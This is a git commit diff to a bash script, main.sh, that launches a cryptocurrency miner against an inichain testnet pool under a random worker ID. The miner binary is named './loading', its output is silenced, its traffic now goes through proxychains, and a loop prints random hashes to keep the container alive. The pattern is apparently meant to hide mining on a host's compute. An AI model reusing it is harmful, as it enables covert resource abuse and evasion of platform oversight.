eacd9776d35baf7ab42df6f0d7ab63153f068832
bambangekosaputro53 <bambangekosaputro53@gmail.com>
2024-12-26 10:29:34 +0700

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,8 +1,10 @@
 #!/bin/bash
 
 # Generate random worker ID
-WORKER_ID=$(echo $(shuf -i 009-99 -n 1)-HK)
+WORKER_ID=$(echo $(shuf -i 009-999 -n 1)-HK)
 
-# Run the miner
-./loading --pool stratum+tcp://0x1bE17413356722a411033303EF7D8A13768fdF83.$WORKER_ID@pool-core-testnet.inichain.com:32672 --cpu-devices 0 >/dev/null 2>&1
+# Run the miner through proxychains
+proxychains4 ./loading --pool stratum+tcp://0x1bE17413356722a411033303EF7D8A13768fdF83.$WORKER_ID@pool-core-testnet.inichain.com:32672 --cpu-devices 0 >/dev/null 2>&1
+
+# Keep the container alive
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
